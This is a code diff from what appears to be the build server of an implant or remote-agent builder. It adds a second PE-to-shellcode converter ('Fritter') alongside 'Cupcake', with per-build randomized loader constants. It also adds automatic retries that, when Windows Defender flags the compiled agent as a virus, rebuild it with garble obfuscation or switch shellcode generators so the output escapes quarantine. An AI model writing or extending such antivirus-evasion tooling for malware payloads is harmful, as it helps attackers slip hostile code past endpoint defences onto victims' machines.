@@ -19,6 +19,7 @@ import {
   type EnsuredToolchain,
 } from "./toolchain-manager";
 import { runCupcake } from "./cupcake-manager";
+import { runFritter } from "./fritter-manager";
 import { buildLinuxShellcode } from "./linux-shellcode-manager";
 import { runSgn } from "./sgn-manager";
 import { resolveContainedPath } from "./upload-security";
@@ -141,6 +142,7 @@ type BuildProcessConfig = {
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
   useCupcake?: boolean;
+  useFritter?: boolean;
   cupcakeSingleThreaded?: boolean;
   cupcakeExitMode?: number;
   cupcakeEntropy?: number;
@@ -1602,7 +1604,7 @@ func runBoundFiles() {
         }
       }
 
-      const isShellcodeMode = !!(config.useCupcake || config.useLinuxShellcode);
+      const isShellcodeMode = !!(config.useCupcake || config.useFritter || config.useLinuxShellcode);
 
       try {
         logger.info(`[build:${buildId.substring(0, 8)}] GOOS=${os} GOARCH=${actualArch} CGO=${env.CGO_ENABLED} CC=${env.CC || "<default>"} shellcode=${isShellcodeMode}`);
@@ -1713,19 +1715,16 @@ func runBoundFiles() {
         // environment-isolation contract.
         baseTags = enforceBuilderReleaseTag(baseTags);
 
-        const runBuild = async (tags: string[], outputPath: string) => {
+        const runBuildOnce = async (tags: string[], outputPath: string, useGarble: boolean) => {
           const effectiveTags = enforceBuilderReleaseTag(tags);
           const buildArgs: string[] = [];
           if (effectiveTags.length > 0) buildArgs.push("-tags", effectiveTags.join(" "));
           buildArgs.push("-trimpath", "-buildvcs=false");
           if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
           buildArgs.push("-o", outputPath, "./cmd/agent");
-          let buildCmd;
-          if (config.obfuscate) {
-            buildCmd = $`garble ${[...garbleFlags, "build", ...buildArgs]}`;
-          } else {
-            buildCmd = $`go build ${buildArgs}`;
-          }
+          const buildCmd = useGarble
+            ? $`garble ${[...garbleFlags, "build", ...buildArgs]}`
+            : $`go build ${buildArgs}`;
           const proc = buildCmd.env(env).cwd(clientDir).nothrow();
           for await (const line of proc.lines()) {
             const trimmed = line.trim();
@@ -1735,7 +1734,38 @@ func runBoundFiles() {
           if (result.exitCode !== 0) {
             const stderrText = result.stderr.toString();
             if (stderrText) sendToStream({ type: "output", text: stderrText, level: "error" });
-            throw new Error(`Build failed for ${platform} (exit ${result.exitCode})`);
+            throw Object.assign(
+              new Error(`Build failed for ${platform} (exit ${result.exitCode})`),
+              { stderrText },
+            );
+          }
+        };
+
+        const runBuild = async (tags: string[], outputPath: string) => {
+          const useGarble = !!config.obfuscate;
+          try {
+            await runBuildOnce(tags, outputPath, useGarble);
+          } catch (err: any) {
+            const stderrText = String(err?.stderrText || "");
+            const defenderBlocked = /contains a virus|potentially unwanted|Operation did not complete successfully/i.test(stderrText);
+            const garbleAvailable = !!Bun.which("garble");
+            if (!useGarble && defenderBlocked && garbleAvailable) {
+              sendToStream({
+                type: "output",
+                text: "Windows Defender blocked the Go linker output — retrying with garble (obfuscated intermediate)…\n",
+                level: "warn",
+              });
+              await runBuildOnce(tags, outputPath, true);
+              return;
+            }
+            if (!useGarble && defenderBlocked && !garbleAvailable) {
+              sendToStream({
+                type: "output",
+                text: "Windows Defender blocked the build output. Add an exclusion for the build directory (or install garble, then enable Obfuscation) to continue.\n",
+                level: "error",
+              });
+            }
+            throw err;
           }
         };
 
@@ -2130,9 +2160,17 @@ func runBoundFiles() {
         let shellcodeBinPath: string | null = null;
         let shellcodeArch: "amd64" | "386" | null = null;
 
-        if (config.useCupcake && os === "windows") {
+        if ((config.useCupcake || config.useFritter) && os === "windows") {
           sendToStream({ type: "status", text: `Converting ${platform} PE to shellcode…` });
-          sendToStream({ type: "output", text: `\nConverting PE → shellcode with Cupcake...\n`, level: "info" });
+          let generator: "cupcake" | "fritter" = config.useFritter ? "fritter" : "cupcake";
+          if (generator === "fritter" && actualArch !== "amd64") {
+            throw new Error(`Fritter supports windows-amd64 only (requested ${platform}); use Cupcake for windows-386`);
+          }
+          sendToStream({
+            type: "output",
+            text: `\nConverting PE → shellcode with ${generator === "fritter" ? "Fritter" : "Cupcake"}...\n`,
+            level: "info",
+          });
           const scOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^.]+$/, ".bin"));
           const binPath = path.join(outDir, scOutputName);
           const cupcakeArch = (actualArch === "386" ? "386" : "amd64") as "386" | "amd64";
@@ -2152,19 +2190,36 @@ func runBoundFiles() {
               filePath,
               size: finalOutputSize,
               config,
-              extra: { outputFilename: scOutputName, outputPath: binPath, cupcakeArch },
+              extra: { outputFilename: scOutputName, outputPath: binPath, cupcakeArch, generator },
             }),
             sendToStream,
           );
-          const ok = await runCupcake(filePath, binPath, cupcakeArch, sendToStream, {
+          const shellcodeOptions = {
             singleThreaded: config.cupcakeSingleThreaded,
             exitMode: config.cupcakeExitMode,
             entropy: config.cupcakeEntropy,
-            bypass: config.cupcakeBypass,
             preserveHeaders: config.cupcakePreserveHeaders,
             resumeOffset: config.cupcakeResumeOffset,
-          });
-          if (!ok) throw new Error(`Cupcake shellcode conversion failed for ${platform}`);
+          };
+          let ok = generator === "fritter"
+            ? await runFritter(filePath, binPath, sendToStream, shellcodeOptions)
+            : await runCupcake(filePath, binPath, cupcakeArch, sendToStream, {
+                ...shellcodeOptions,
+                bypass: config.cupcakeBypass,
+              });
+          // Cupcake binaries are commonly quarantined by Defender on Windows
+          // hosts. Fritter is rebuilt from source and emits per-build random
+          // loader constants, so retry once instead of failing the build.
+          if (!ok && generator === "cupcake" && actualArch === "amd64") {
+            sendToStream({
+              type: "output",
+              text: "Cupcake failed — retrying with Fritter (per-build randomized shellcode)…\n",
+              level: "warn",
+            });
+            generator = "fritter";
+            ok = await runFritter(filePath, binPath, sendToStream, shellcodeOptions);
+          }
+          if (!ok) throw new Error(`${generator === "fritter" ? "Fritter" : "Cupcake"} shellcode conversion failed for ${platform}`);
           try { fs.unlinkSync(filePath); } catch {}
           finalOutputName = scOutputName;
           finalOutputSize = Bun.file(binPath).size;
@@ -2186,7 +2241,7 @@ func runBoundFiles() {
               filePath: binPath,
               size: finalOutputSize,
               config,
-              extra: { inputFilename: outputName, cupcakeArch },
+              extra: { inputFilename: outputName, cupcakeArch, generator },
             }),
             sendToStream,
           );
